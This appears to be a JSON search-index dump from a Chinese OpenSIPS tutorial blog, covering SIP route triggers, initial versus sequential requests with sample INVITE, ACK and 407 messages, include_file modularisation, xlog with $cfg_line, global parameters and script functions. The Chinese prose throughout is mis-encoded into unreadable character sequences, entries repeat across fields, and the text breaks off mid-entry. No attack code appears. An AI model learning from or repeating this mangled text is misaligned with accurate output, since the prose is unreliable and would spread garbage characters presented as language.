**è¿›å…¥opensips(**incoming) ç¦»å¼€opensips(outgoing) è¯·æ±‚ è§¦å‘è¯·æ±‚è·¯ç”±ï¼šä¾‹å¦‚invite, register, ack è§¦å‘åˆ†æ”¯è·¯ç”±ã€‚å¦‚inviteçš„è½¬å‘ å“åº” è§¦å‘å“åº”è·¯ç”±ã€‚å¦‚æœæ˜¯å¤§äºç­‰äº300çš„å“åº”ï¼Œè¿˜ä¼šè§¦å‘å¤±è´¥è·¯ç”±ã€‚ ä¸ä¼šè§¦å‘ä»»ä½•è·¯ç”± ","title":"è·¯ç”±çš„è§¦å‘æ—¶æœº"},{"content":"åœ¨è¯´è¿™ä¸¤ç§è·¯ç”±å‰ï¼Œå…ˆè¯´ä¸€ä¸ªæ•…äº‹ã€‚èš‚èšæ‰¾é£Ÿç‰©ã€‚\nèšç¾¤é‡Œæœ‰ä¸€ç§èš‚èšè´Ÿè´£æœå¯»é£Ÿç‰©å«åšä¾¦å¯Ÿå…µï¼Œä¾¦å¯Ÿå…µå¾—åˆ°æ¶ˆæ¯ï¼Œä¸è¿œå¤„å¯èƒ½æœ‰é£Ÿç‰©ã€‚äºæ˜¯ä¾¦å¯Ÿå…µå¼€å§‹æœç´¢é£Ÿç‰©çš„ä½ç½®ï¼Œå¹¶æ²¿é€”ç•™ä¸‹è‡ªå·±çš„æ°”å‘³ã€‚ç¿»è¿‡å‡ åº§å±±ä¹‹åï¼Œä¾¦å¯Ÿå…µå‘ç°äº†é£Ÿç‰©ã€‚ç„¶ååˆæ²¿ç€æ°”å‘³å›åˆ°äº†éƒ¨è½ã€‚ç„¶åé€šçŸ¥æ¬è¿å…µï¼Œæ²¿ç€è‡ªå·±ç•™ä¸‹çš„æ°”å‘³ï¼Œå°±å¯ä»¥æ‰¾åˆ°é£Ÿç‰©ã€‚\nåœ¨ä¸Šé¢çš„æ•…äº‹ä¸­ï¼Œä¾¦æŸ¥å…µå¯ä»¥çœ‹æˆæ˜¯åˆå§‹åŒ–è¯·æ±‚ï¼Œæ¬è¿å¹¶å¯ä»¥çœ‹åšæ˜¯åºåˆ—åŒ–è¯·æ±‚ã€‚åœ¨å­¦ä¹ opensipsçš„è·¯ç”±è¿‡ç¨‹ä¸­ï¼Œèƒ½å¤ŸåŒºåˆ†åˆå§‹åŒ–è¯·æ±‚å’Œåºåˆ—åŒ–è¯·æ±‚ï¼Œæ˜¯éå¸¸é‡è¦çš„ã€‚\nä¸€èˆ¬è·¯ç”±å¤„ç†ï¼ŒæŸ¥æ•°æ®åº“ï¼ŒæŸ¥dnsç­‰éƒ½åœ¨åˆå§‹åŒ–è¯·æ±‚ä¸­åšå¤„ç†ï¼Œåºåˆ—åŒ–è¯·æ±‚åªéœ€è¦ç®€å•çš„æ›´å…·sip routeå­—æ®µå»è·¯ç”±å°±å¯ä»¥äº†ã€‚\nç±»å‹ åŠŸèƒ½ message å¦‚ä½•åŒºåˆ† ç‰¹ç‚¹ åˆå§‹åŒ–è¯·æ±‚ åˆ›å»ºsessionæˆ–è€…dialog invite has_totag()æ˜¯false 1. å‘ç°è¢«å«ï¼šåˆå§‹åŒ–è¯·æ±‚ç»è¿‡ä¸åŒçš„æœåŠ¡å™¨ï¼ŒDNSæœåŠ¡å™¨ï¼Œå‰ç¼€è·¯ç”±ç­‰å„ç§å¤æ‚çš„è·¯ç”±æ–¹æ³•ï¼Œæ‰¾åˆ°è¢«å«2. **è®°å½•è·¯å¾„:Â **è®°å½•åˆ°è¾¾è¢«å«çš„è·¯å¾„ï¼Œç»™åç»­çš„åºåˆ—è¯·æ±‚æä¾›å¯¼èˆª åºåˆ—åŒ–è¯·æ±‚ ä¿®æ”¹æˆ–è€…ç»ˆæ­¢session ack, bye, re-ivite, notify has_totag()æ˜¯true 1. åªéœ€è¦æ ¹æ®åˆå§‹åŒ–è¯·æ±‚æä¾›çš„å¯¼èˆªè·¯å¾„ï¼Œæ¥åˆ°è¾¾è·¯å¾„ï¼Œä¸éœ€è¦å¤æ‚çš„è·¯ç”±é€»è¾‘ã€‚ åŒºåˆ†åˆå§‹åŒ–è¯·æ±‚å’Œåºåˆ—åŒ–è¯·æ±‚ï¼Œæ˜¯ç”¨headerå­—æ®µä¸­çš„toå­—æ®µæ˜¯å¦å«æœ‰tagæ ‡ç­¾ã€‚\ntagå‚æ•°è¢«ç”¨äºtoå’Œfromå­—æ®µã€‚ä½¿ç”¨callidï¼Œfromtagå’Œtotagä¸‰ä¸ªå­—æ®µå¯ä»¥æ¥å”¯ä¸€è¯†åˆ«ä¸€ä¸ªdialogã€‚æ¯ä¸ªtagæ¥è‡ªä¸€ä¸ªuaã€‚\nå½“ä¸€ä¸ªuaå‘å‡ºä¸€ä¸ªä¸åœ¨å¯¹è¯ä¸­çš„è¯·æ±‚æ—¶ï¼Œfromtagæä¾›ä¸€åŠçš„å¯¹è¯æ ‡è¯†ï¼Œå½“å¯¹è¯å®Œæˆæ—¶ï¼Œå¦ä¸€æ–¹å‚ä¸è€…æä¾›totagæ ‡è¯†ã€‚\nä¸¾ä¾‹æ¥è¯´ï¼Œå¯¹äºä¸€ä¸ªinviteè¯·æ±‚ï¼Œä¾‹å¦‚Alice-\u0026gt;Proxy\ninviteè¯·æ±‚toå­—æ®µæ— tagå‚æ•° å½“aliceå›ackè¯·æ±‚æ—¶ï¼Œå·²ç»å«æœ‰äº†to tagã€‚è¿™å°±æ˜¯ä¸€ä¸ªåºåˆ—åŒ–è¯·æ±‚äº†ã€‚å› ä¸ºé€šè¿‡ä¹‹å‰çš„200ok, aliceå·²ç»çŸ¥é“åˆ°è¾¾bobçš„è·¯å¾„ã€‚ INVITE sip:bob@biloxi.example.com SIP/2.0 Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch=z9hG4bK74b43 Max-Forwards: 70 Route: \u0026lt;sip:ss1.atlanta.example.com;lr\u0026gt; From: Alice \u0026lt;sip:alice@atlanta.example.com\u0026gt;;tag=9fxced76sl # æœ‰from tag To: Bob \u0026lt;sip:bob@biloxi.example.com\u0026gt; # æ— to tag Call-ID: 3848276298220188511@atlanta.example.com CSeq: 1 INVITE Contact: \u0026lt;sip:alice@client.atlanta.example.com;transport=tcp\u0026gt; Content-Type: application/sdp Content-Length: 151 ACK sip:bob@client.biloxi.example.com SIP/2.0 Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch=z9hG4bK74b76 Max-Forwards: 70 Route: \u0026lt;sip:ss1.atlanta.example.com;lr\u0026gt;, \u0026lt;sip:ss2.biloxi.example.com;lr\u0026gt; From: Alice \u0026lt;sip:alice@atlanta.example.com\u0026gt;;tag=9fxced76sl To: Bob \u0026lt;sip:bob@biloxi.example.com\u0026gt;;tag=314159 Call-ID: 3848276298220188511@atlanta.example.com CSeq: 2 ACK Content-Length: 0 æ³¨æ„ï¼Œä¸€å®šè¦æ˜ç¡®ä¸€ä¸ªæ¶ˆæ¯ï¼Œåˆ°åº•æ˜¯è¯·æ±‚è¿˜æ˜¯å“åº”ã€‚æˆ‘ä»¬è¯´åˆå§‹åŒ–è¯·æ±‚å’Œåºåˆ—åŒ–è¯·æ±‚ï¼Œè¯´çš„éƒ½æ˜¯è¯·æ±‚ï¼Œè€Œä¸æ˜¯å“åº”ã€‚\næœ‰äº›å“åº”æ•ˆåº”ï¼Œä¾‹å¦‚ä»£ç†è¿”å›çš„407å“åº”ï¼Œä¹Ÿä¼šå¸¦æœ‰to tagã€‚\nSIP/2.0 407 Proxy Authorization Required Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch=z9hG4bK74b43 ;received=192.0.2.101 From: Alice \u0026lt;sip:alice@atlanta.example.com\u0026gt;;tag=9fxced76sl To: Bob \u0026lt;sip:bob@biloxi.example.com\u0026gt;;tag=3flal12sf Call-ID: 3848276298220188511@atlanta.example.com CSeq: 1 INVITE Proxy-Authenticate: Digest realm=\u0026#34;atlanta.example.com\u0026#34;, qop=\u0026#34;auth\u0026#34;, nonce=\u0026#34;f84f1cec41e6cbe5aea9c8e88d359\u0026#34;, opaque=\u0026#34;\u0026#34;, stale=FALSE, algorithm=MD5 Content-Length: 0 ä¸‹å›¾åˆå§‹åŒ–è¯·æ±‚\nä¸‹å›¾åºåˆ—åŒ–è¯·æ±‚\nè·¯ç”±è„šæœ¬ä¸­ï¼Œåˆå§‹åŒ–è¯·æ±‚éƒ½æ˜¯è®¸å¤šä¸‹å¾ˆå¤šåŠŸå¤«å»è€ƒè™‘å¦‚ä½•å¤„ç†çš„ã€‚è€Œå¯¹äºåºåˆ—åŒ–è¯·æ±‚çš„å¤„ç†åˆ™è¦ç®€å•çš„å¤šã€‚\n","permalink":"https://wdd.js.org/opensips/ch5/init-seque/","summary":"åœ¨è¯´è¿™ä¸¤ç§è·¯ç”±å‰ï¼Œå…ˆè¯´ä¸€ä¸ªæ•…äº‹ã€‚èš‚èšæ‰¾é£Ÿç‰©ã€‚\nèšç¾¤é‡Œæœ‰ä¸€ç§èš‚èšè´Ÿè´£æœå¯»é£Ÿç‰©å«åšä¾¦å¯Ÿå…µï¼Œä¾¦å¯Ÿå…µå¾—åˆ°æ¶ˆæ¯ï¼Œä¸è¿œå¤„å¯èƒ½æœ‰é£Ÿç‰©ã€‚äºæ˜¯ä¾¦å¯Ÿå…µå¼€å§‹æœç´¢é£Ÿç‰©çš„ä½ç½®ï¼Œå¹¶æ²¿é€”ç•™ä¸‹è‡ªå·±çš„æ°”å‘³ã€‚ç¿»è¿‡å‡ åº§å±±ä¹‹åï¼Œä¾¦å¯Ÿå…µå‘ç°äº†é£Ÿç‰©ã€‚ç„¶ååˆæ²¿ç€æ°”å‘³å›åˆ°äº†éƒ¨è½ã€‚ç„¶åé€šçŸ¥æ¬è¿å…µï¼Œæ²¿ç€è‡ªå·±ç•™ä¸‹çš„æ°”å‘³ï¼Œå°±å¯ä»¥æ‰¾åˆ°é£Ÿç‰©ã€‚\nåœ¨ä¸Šé¢çš„æ•…äº‹ä¸­ï¼Œä¾¦æŸ¥å…µå¯ä»¥çœ‹æˆæ˜¯åˆå§‹åŒ–è¯·æ±‚ï¼Œæ¬è¿å¹¶å¯ä»¥çœ‹åšæ˜¯åºåˆ—åŒ–è¯·æ±‚ã€‚åœ¨å­¦ä¹ opensipsçš„è·¯ç”±è¿‡ç¨‹ä¸­ï¼Œèƒ½å¤ŸåŒºåˆ†åˆå§‹åŒ–è¯·æ±‚å’Œåºåˆ—åŒ–è¯·æ±‚ï¼Œæ˜¯éå¸¸é‡è¦çš„ã€‚\nä¸€èˆ¬è·¯ç”±å¤„ç†ï¼ŒæŸ¥æ•°æ®åº“ï¼ŒæŸ¥dnsç­‰éƒ½åœ¨åˆå§‹åŒ–è¯·æ±‚ä¸­åšå¤„ç†ï¼Œåºåˆ—åŒ–è¯·æ±‚åªéœ€è¦ç®€å•çš„æ›´å…·sip routeå­—æ®µå»è·¯ç”±å°±å¯ä»¥äº†ã€‚\nç±»å‹ åŠŸèƒ½ message å¦‚ä½•åŒºåˆ† ç‰¹ç‚¹ åˆå§‹åŒ–è¯·æ±‚ åˆ›å»ºsessionæˆ–è€…dialog invite has_totag()æ˜¯false 1. å‘ç°è¢«å«ï¼šåˆå§‹åŒ–è¯·æ±‚ç»è¿‡ä¸åŒçš„æœåŠ¡å™¨ï¼ŒDNSæœåŠ¡å™¨ï¼Œå‰ç¼€è·¯ç”±ç­‰å„ç§å¤æ‚çš„è·¯ç”±æ–¹æ³•ï¼Œæ‰¾åˆ°è¢«å«2. **è®°å½•è·¯å¾„:Â **è®°å½•åˆ°è¾¾è¢«å«çš„è·¯å¾„ï¼Œç»™åç»­çš„åºåˆ—è¯·æ±‚æä¾›å¯¼èˆª åºåˆ—åŒ–è¯·æ±‚ ä¿®æ”¹æˆ–è€…ç»ˆæ­¢session ack, bye, re-ivite, notify has_totag()æ˜¯true 1. åªéœ€è¦æ ¹æ®åˆå§‹åŒ–è¯·æ±‚æä¾›çš„å¯¼èˆªè·¯å¾„ï¼Œæ¥åˆ°è¾¾è·¯å¾„ï¼Œä¸éœ€è¦å¤æ‚çš„è·¯ç”±é€»è¾‘ã€‚ åŒºåˆ†åˆå§‹åŒ–è¯·æ±‚å’Œåºåˆ—åŒ–è¯·æ±‚ï¼Œæ˜¯ç”¨headerå­—æ®µä¸­çš„toå­—æ®µæ˜¯å¦å«æœ‰tagæ ‡ç­¾ã€‚\ntagå‚æ•°è¢«ç”¨äºtoå’Œfromå­—æ®µã€‚ä½¿ç”¨callidï¼Œfromtagå’Œtotagä¸‰ä¸ªå­—æ®µå¯ä»¥æ¥å”¯ä¸€è¯†åˆ«ä¸€ä¸ªdialogã€‚æ¯ä¸ªtagæ¥è‡ªä¸€ä¸ªuaã€‚\nå½“ä¸€ä¸ªuaå‘å‡ºä¸€ä¸ªä¸åœ¨å¯¹è¯ä¸­çš„è¯·æ±‚æ—¶ï¼Œfromtagæä¾›ä¸€åŠçš„å¯¹è¯æ ‡è¯†ï¼Œå½“å¯¹è¯å®Œæˆæ—¶ï¼Œå¦ä¸€æ–¹å‚ä¸è€…æä¾›totagæ ‡è¯†ã€‚\nä¸¾ä¾‹æ¥è¯´ï¼Œå¯¹äºä¸€ä¸ªinviteè¯·æ±‚ï¼Œä¾‹å¦‚Alice-\u0026gt;Proxy\ninviteè¯·æ±‚toå­—æ®µæ— tagå‚æ•° å½“aliceå›ackè¯·æ±‚æ—¶ï¼Œå·²ç»å«æœ‰äº†to tagã€‚è¿™å°±æ˜¯ä¸€ä¸ªåºåˆ—åŒ–è¯·æ±‚äº†ã€‚å› ä¸ºé€šè¿‡ä¹‹å‰çš„200ok, aliceå·²ç»çŸ¥é“åˆ°è¾¾bobçš„è·¯å¾„ã€‚ INVITE sip:bob@biloxi.example.com SIP/2.0 Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch=z9hG4bK74b43 Max-Forwards: 70 Route: \u0026lt;sip:ss1.atlanta.example.com;lr\u0026gt; From: Alice \u0026lt;sip:alice@atlanta.example.com\u0026gt;;tag=9fxced76sl # æœ‰from tag To: Bob \u0026lt;sip:bob@biloxi.example.com\u0026gt; # æ— to tag Call-ID: 3848276298220188511@atlanta.example.com CSeq: 1 INVITE Contact: \u0026lt;sip:alice@client.atlanta.example.com;transport=tcp\u0026gt; Content-Type: application/sdp Content-Length: 151 ACK sip:bob@client.biloxi.example.com SIP/2.","title":"ã€é‡ç‚¹ã€‘åˆå§‹åŒ–è¯·æ±‚å’Œåºåˆ—åŒ–è¯·æ±‚"},{"content":"å½“ä½ çš„ä»£ç ä¸€ä¸ªå±å¹•æ— æ³•å±•ç¤ºå®Œæ—¶ï¼Œä½ å°±éœ€è¦è€ƒè™‘æ¨¡å—åŒ–çš„äº‹æƒ…äº†ã€‚\nç»´æŠ¤ä¸€ä¸ªä¸Šåƒè¡Œçš„ä»£ç ï¼Œæ˜¯å¾ˆè¾›è‹¦ï¼Œä¹Ÿæ˜¯å¾ˆææ€–çš„äº‹æƒ…ã€‚\næˆ‘ä»¬åº”å½“æŠŠè‡ªå·±çš„å…³æ³¨ç‚¹æ”¾åœ¨æŸä¸ªå…·ä½“çš„ç‚¹ä¸Šã€‚\næ–¹æ³•1 include_file å…·ä½“æ–¹æ³•æ˜¯ä½¿ç”¨include_fileå‚æ•°ã€‚\nå¦‚æœä½ çš„opensips.cfgæ–‡ä»¶åˆ°è¾¾ä¸Šåƒè¡Œï¼Œä½ å¯ä»¥è€ƒè™‘ä½¿ç”¨ä¸€ä¸‹include_fileæŒ‡ä»¤ã€‚\ninclude_file \u0026#34;global.cfg\u0026#34; include_file \u0026#34;moudule.cfg\u0026#34; include_file \u0026#34;routing.cfg\u0026#34; æ–¹æ³•2 m4 å®ç¼–è¯‘ å‚è€ƒï¼šhttps://github.com/wangduanduan/m4-opensips.cfg\n","permalink":"https://wdd.js.org/opensips/ch5/module/","summary":"å½“ä½ çš„ä»£ç ä¸€ä¸ªå±å¹•æ— æ³•å±•ç¤ºå®Œæ—¶ï¼Œä½ å°±éœ€è¦è€ƒè™‘æ¨¡å—åŒ–çš„äº‹æƒ…äº†ã€‚\nç»´æŠ¤ä¸€ä¸ªä¸Šåƒè¡Œçš„ä»£ç ï¼Œæ˜¯å¾ˆè¾›è‹¦ï¼Œä¹Ÿæ˜¯å¾ˆææ€–çš„äº‹æƒ…ã€‚\næˆ‘ä»¬åº”å½“æŠŠè‡ªå·±çš„å…³æ³¨ç‚¹æ”¾åœ¨æŸä¸ªå…·ä½“çš„ç‚¹ä¸Šã€‚\næ–¹æ³•1 include_file å…·ä½“æ–¹æ³•æ˜¯ä½¿ç”¨include_fileå‚æ•°ã€‚\nå¦‚æœä½ çš„opensips.cfgæ–‡ä»¶åˆ°è¾¾ä¸Šåƒè¡Œï¼Œä½ å¯ä»¥è€ƒè™‘ä½¿ç”¨ä¸€ä¸‹include_fileæŒ‡ä»¤ã€‚\ninclude_file \u0026#34;global.cfg\u0026#34; include_file \u0026#34;moudule.cfg\u0026#34; include_file \u0026#34;routing.cfg\u0026#34; æ–¹æ³•2 m4 å®ç¼–è¯‘ å‚è€ƒï¼šhttps://github.com/wangduanduan/m4-opensips.cfg","title":"è„šæœ¬è·¯ç”±æ¨¡å—åŒ–"},{"content":"åœ¨opensips 2.2ä¸­åŠ å…¥æ–°çš„å…¨å±€é…ç½®cfg_line, ç”¨æ¥è¿”å›å½“å‰æ—¥å¿—åœ¨æ•´ä¸ªæ–‡ä»¶ä¸­çš„è¡Œæ•°ã€‚\næ³¨æ„ï¼Œä½äº2.2çš„ç‰ˆæœ¬ä¸èƒ½ä½¿ç”¨cfg_lineã€‚\nä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\n... xlog(\u0026#34;$cfg_line enter_ack_deal\u0026#34;) ... xlog(\u0026#34;$cfg_line enter_ack_deal\u0026#34;) ... å¦‚æœæ²¡æœ‰cfg_lineè¿™ä¸ªå‚æ•°ï¼Œä½ åœ¨æ—¥å¿—ä¸­çœ‹åˆ°enter_ack_dealåï¼Œæ ¹æœ¬æ— æ³•åŒºåˆ†æ˜¯å“ªä¸€è¡Œæ‰“å°äº†è¿™ä¸ªå…³é”®è¯ã€‚\nä½¿ç”¨äº†cfg_lineåï¼Œå¯ä»¥åœ¨æ—¥å¿—ä¸­çœ‹åˆ°ç±»ä¼¼å¦‚ä¸‹çš„æ—¥å¿—è¾“å‡ºæ–¹å¼ï¼Œå¾ˆå®¹æ˜“åŒºåˆ†å“ªä¸€è¡Œæ—¥å¿—æ‰§è¡Œäº†ã€‚\n23 enter_ack_deal 823 enter_ack_deal ","permalink":"https://wdd.js.org/opensips/ch5/xlog/","summary":"åœ¨opensips 2.2ä¸­åŠ å…¥æ–°çš„å…¨å±€é…ç½®cfg_line, ç”¨æ¥è¿”å›å½“å‰æ—¥å¿—åœ¨æ•´ä¸ªæ–‡ä»¶ä¸­çš„è¡Œæ•°ã€‚\næ³¨æ„ï¼Œä½äº2.2çš„ç‰ˆæœ¬ä¸èƒ½ä½¿ç”¨cfg_lineã€‚\nä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\n... xlog(\u0026#34;$cfg_line enter_ack_deal\u0026#34;) ... xlog(\u0026#34;$cfg_line enter_ack_deal\u0026#34;) ... å¦‚æœæ²¡æœ‰cfg_lineè¿™ä¸ªå‚æ•°ï¼Œä½ åœ¨æ—¥å¿—ä¸­çœ‹åˆ°enter_ack_dealåï¼Œæ ¹æœ¬æ— æ³•åŒºåˆ†æ˜¯å“ªä¸€è¡Œæ‰“å°äº†è¿™ä¸ªå…³é”®è¯ã€‚\nä½¿ç”¨äº†cfg_lineåï¼Œå¯ä»¥åœ¨æ—¥å¿—ä¸­çœ‹åˆ°ç±»ä¼¼å¦‚ä¸‹çš„æ—¥å¿—è¾“å‡ºæ–¹å¼ï¼Œå¾ˆå®¹æ˜“åŒºåˆ†å“ªä¸€è¡Œæ—¥å¿—æ‰§è¡Œäº†ã€‚\n23 enter_ack_deal 823 enter_ack_deal ","title":"ä¼˜é›…çš„ä½¿ç”¨xlogè¾“å‡ºæ—¥å¿—è¡Œ"},{"content":"æœ¬å…¨å±€å‚æ•°åŸºäºopensips 2.4ä»‹ç»ã€‚\nopensipsçš„å…¨å±€å‚æ•°æœ‰å¾ˆå¤šï¼Œå…·ä½“å¯ä»¥å‚è€ƒã€‚https://www.opensips.org/Documentation/Script-CoreParameters-2-4#toc37\nä¸‹é¢ä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„å‚æ•°\nlog_level=3 log_facility=LOG_LOCAL0 listen=172.16.200.228:4400 log_level log_levelçš„å€¼é…ç½®çš„è¶Šå¤§ï¼Œè¾“å‡ºçš„æ—¥å¿—è¶Šè¯¦ç»†ã€‚log_levelçš„å€¼çš„èŒƒå›´æ˜¯[-3, 4]\n-3 - Alert level -2 - Critical level -1 - Error level 1 - Warning level 2 - Notice level 3 - Info level 4 - Debug level log_facility log_facilityç”¨æ¥è®¾ç½®ç‹¬ç«‹çš„opensipsæ—¥å¿—æ–‡ä»¶ï¼Œå‚è€ƒhttps://www.yuque.com/wangdd/opensips/log\nlisten listenç”¨æ¥è®¾ç½®opensipsç›‘å¬çš„ç«¯å£å’Œåè®®, ç”±äºopensipsåº•å±‚æ”¯æŒçš„åè®®å¾ˆå¤šï¼Œæ‰€ä»¥ä½ å¯ä»¥ç›‘å¬å¾ˆå¤šä¸åŒåè®®ã€‚\næ³¨æ„ä¸€ç‚¹ï¼šä¸è¦ç›‘å¬æœ¬åœ°ç¯å›åœ°å€127.0.0.1, è€Œè¦ç›‘å¬etho0çš„ipåœ°å€ã€‚\nlisten:udp:172.16.200.228:5060 listen:tcp:172.16.200.228:5061 listen:ws:172.16.200.228:5062 ","permalink":"https://wdd.js.org/opensips/ch5/global-params/","summary":"æœ¬å…¨å±€å‚æ•°åŸºäºopensips 2.4ä»‹ç»ã€‚\nopensipsçš„å…¨å±€å‚æ•°æœ‰å¾ˆå¤šï¼Œå…·ä½“å¯ä»¥å‚è€ƒã€‚https://www.opensips.org/Documentation/Script-CoreParameters-2-4#toc37\nä¸‹é¢ä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„å‚æ•°\nlog_level=3 log_facility=LOG_LOCAL0 listen=172.16.200.228:4400 log_level log_levelçš„å€¼é…ç½®çš„è¶Šå¤§ï¼Œè¾“å‡ºçš„æ—¥å¿—è¶Šè¯¦ç»†ã€‚log_levelçš„å€¼çš„èŒƒå›´æ˜¯[-3, 4]\n-3 - Alert level -2 - Critical level -1 - Error level 1 - Warning level 2 - Notice level 3 - Info level 4 - Debug level log_facility log_facilityç”¨æ¥è®¾ç½®ç‹¬ç«‹çš„opensipsæ—¥å¿—æ–‡ä»¶ï¼Œå‚è€ƒhttps://www.yuque.com/wangdd/opensips/log\nlisten listenç”¨æ¥è®¾ç½®opensipsç›‘å¬çš„ç«¯å£å’Œåè®®, ç”±äºopensipsåº•å±‚æ”¯æŒçš„åè®®å¾ˆå¤šï¼Œæ‰€ä»¥ä½ å¯ä»¥ç›‘å¬å¾ˆå¤šä¸åŒåè®®ã€‚\næ³¨æ„ä¸€ç‚¹ï¼šä¸è¦ç›‘å¬æœ¬åœ°ç¯å›åœ°å€127.0.0.1, è€Œè¦ç›‘å¬etho0çš„ipåœ°å€ã€‚\nlisten:udp:172.16.200.228:5060 listen:tcp:172.16.200.228:5061 listen:ws:172.16.200.228:5062 ","title":"å…¨å±€å‚æ•°é…ç½®"},{"content":"opensipsè„šæœ¬ä¸­æ²¡æœ‰ç±»ä¼¼functionè¿™æ ·çš„å…³é”®å­—æ¥å®šä¹‰å‡½æ•°ï¼Œå®ƒçš„å‡½æ•°ä¸»è¦æœ‰ä¸¤ä¸ªæ¥æºã€‚\nopensipsæ ¸å¿ƒæä¾›çš„å‡½æ•°:Â æ¨¡å—æä¾›çš„å‡½æ•°:Â lb_is_destination(),Â consume_credentials() å‡½æ•°ç‰¹ç‚¹ opensipså‡½æ•°çš„ç‰¹ç‚¹\næœ€å¤šæ”¯æŒ6ä¸ªå‚æ•° æ‰€æœ‰çš„å‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œå³ä½¿å†™æˆæ•°å­—ï¼Œè§£ææ—¶ä¹ŸæŒ‰ç…§å­—ç¬¦ä¸²è§£æ å‡½æ•°çš„è¿”å›å€¼åªèƒ½æ˜¯æ•´æ•° æ‰€æœ‰å‡½æ•°ä¸èƒ½è¿”å›0ï¼Œè¿”å›0ä¼šå¯¼è‡´è·¯ç”±åœæ­¢æ‰§è¡Œï¼Œreturn(0)ç›¸å½“äºexit() å‡½æ•°è¿”å›çš„æ­£æ•°å¯ä»¥ç¿»è¯‘æˆtrue å‡½æ•°è¿”å›çš„è´Ÿæ•°ä¼šç¿»è¯‘æˆfalse ä½¿ç”¨return(9)è¿”å›ç»“æœ ä½¿ç”¨$rcè·å–ä¸Šä¸ªå‡½æ•°çš„è¿”å›å€¼ è™½ç„¶opensipsè„šæœ¬ä¸­æ— æ³•è‡ªå®šä¹‰å‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥æŠŠrouteå…³é”®å­—ä½œä¸ºå‡½æ•°æ¥ä½¿ç”¨ã€‚\nå¯ä»¥ç»™\n# å®šä¹‰enter_logå‡½æ•° route[enter_log]{ xlog(\u0026#34;$ci $fu $tu $param(1)\u0026#34;) # $param(1) æ˜¯æŒ‡è°ƒç”¨enter_logå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³wangdd return(1) } route{ # è°ƒç”¨enter_logå‡½æ•° route(enter_log, \u0026#34;wangdd\u0026#34;) # è·å–enter_logçš„è¿”å›å€¼ $rc xlog(\u0026#34;$rc\u0026#34;) } å¦‚ä½•ä¼ å‚ æŸä¸ªå‡½æ•°å¯ä»¥æ”¯æŒ6ä¸ªå‚æ•°ï¼Œå…¨éƒ¨éƒ½æ˜¯çš„å¯é€‰çš„ï¼Œä½†æ˜¯æˆ‘åªæƒ³ä¼ ç¬¬ä¸€ä¸ªå’Œç¬¬6ä¸ªï¼Œåº”è¯¥æ€ä¹ˆä¼ ï¼Ÿ\nä¸æƒ³ä¼ å‚çš„è¯ï¼Œéœ€è¦ä½¿ç”¨é€—å·éš”å¼€\nsiprec_start_recording(srs,,,,,media_ip) ","permalink":"https://wdd.js.org/opensips/ch5/function/","summary":"opensipsè„šæœ¬ä¸­æ²¡æœ‰ç±»ä¼¼functionè¿™æ ·çš„å…³é”®å­—æ¥å®šä¹‰å‡½æ•°ï¼Œå®ƒçš„å‡½æ•°ä¸»è¦æœ‰ä¸¤ä¸ªæ¥æºã€‚\nopensipsæ ¸å¿ƒæä¾›çš„å‡½æ•°:Â æ¨¡å—æä¾›çš„å‡½æ•°:Â lb_is_destination(),Â consume_credentials() å‡½æ•°ç‰¹ç‚¹ opensipså‡½æ•°çš„ç‰¹ç‚¹\næœ€å¤šæ”¯æŒ6ä¸ªå‚æ•° æ‰€æœ‰çš„å‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œå³ä½¿å†™æˆæ•°å­—ï¼Œè§£ææ—¶ä¹ŸæŒ‰ç…§å­—ç¬¦ä¸²è§£æ å‡½æ•°çš„è¿”å›å€¼åªèƒ½æ˜¯æ•´æ•° æ‰€æœ‰å‡½æ•°ä¸èƒ½è¿”å›0ï¼Œè¿”å›0ä¼šå¯¼è‡´è·¯ç”±åœæ­¢æ‰§è¡Œï¼Œreturn(0)ç›¸å½“äºexit() å‡½æ•°è¿”å›çš„æ­£æ•°å¯ä»¥ç¿»è¯‘æˆtrue å‡½æ•°è¿”å›çš„è´Ÿæ•°ä¼šç¿»è¯‘æˆfalse ä½¿ç”¨return(9)è¿”å›ç»“æœ ä½¿ç”¨$rcè·å–ä¸Šä¸ªå‡½æ•°çš„è¿”å›å€¼ è™½ç„¶opensipsè„šæœ¬ä¸­æ— æ³•è‡ªå®šä¹‰å‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥æŠŠrouteå…³é”®å­—ä½œä¸ºå‡½æ•°æ¥ä½¿ç”¨ã€‚\nå¯ä»¥ç»™\n# å®šä¹‰enter_logå‡½æ•° route[enter_log]{ xlog(\u0026#34;$ci $fu $tu $param(1)\u0026#34;) # $param(1) æ˜¯æŒ‡è°ƒç”¨enter_logå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³wangdd return(1) } route{ # è°ƒç”¨enter_logå‡½æ•° route(enter_log, \u0026#34;wangdd\u0026#34;) # è·å–enter_logçš„è¿”å›å€¼ $rc xlog(\u0026#34;$rc\u0026#34;) } å¦‚ä½•ä¼ å‚ æŸä¸ªå‡½æ•°å¯ä»¥æ”¯æŒ6ä¸ªå‚æ•°ï¼Œå…¨éƒ¨éƒ½æ˜¯çš„å¯é€‰çš„ï¼Œä½†æ˜¯æˆ‘åªæƒ³ä¼ ç¬¬ä¸€ä¸ªå’Œç¬¬6ä¸ªï¼Œåº”è¯¥æ€ä¹ˆä¼ ï¼Ÿ\nä¸æƒ³ä¼ å‚çš„è¯ï¼Œéœ€è¦ä½¿ç”¨é€—å·éš”å¼€\nsiprec_start_recording(srs,,,,,media_ip) ","title":"å‡½æ•°ç‰¹ç‚¹"},{"content":"opensipsè·¯ç”±åˆ†ä¸ºä¸¤ç±»ï¼Œä¸»è·¯ç”±å’Œå­è·¯ç”±ã€‚ä¸»è·¯ç”±è¢«opensipsè°ƒç”¨ï¼Œå­è·¯ç”±åœ¨ä¸»è·¯ç”±ä¸­è¢«è°ƒç”¨ã€‚å¯ä»¥ç†è§£å­è·¯ç”±æ˜¯ä¸€ç§å‡½æ•°ã€‚\næ‰€æœ‰è·¯ç”±ä¸­ä¸å…è®¸å‡ºç°æ— 